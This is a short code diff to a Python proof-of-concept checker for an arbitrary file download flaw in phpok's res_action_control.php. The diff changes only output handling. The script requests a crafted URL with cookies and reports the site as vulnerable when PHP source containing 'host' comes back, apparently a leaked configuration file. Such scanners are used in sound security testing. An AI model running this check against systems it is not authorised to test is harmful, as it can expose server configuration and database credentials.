@@ -9,8 +9,8 @@ description: 参数file未经过滤进入到下载方法导致任意文件下载
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class phpok_res_action_control_filedownload_BaseVerify:
     def __init__(self, url):
@@ -33,12 +33,12 @@ class phpok_res_action_control_filedownload_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, cookies=cookies, timeout=10, verify=False)
             if r"<?php" in req.text and r"host" in req.text:
-                cprint("[+]存在phpok res_action_control.php 任意文件下载(需要cookies文件)漏洞...(高危)\tpayload: "+vulnurl+"\ncookies:"+json.dumps(cookies, indent=4), "red")
+                return "[+]存在phpok res_action_control.php 任意文件下载(需要cookies文件)漏洞...(高危)\tpayload: "+vulnurl+"\ncookies:"+json.dumps(cookies, indent=4)
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = phpok_res_action_control_filedownload_BaseVerify(sys.argv[1])
     testVuln.run()
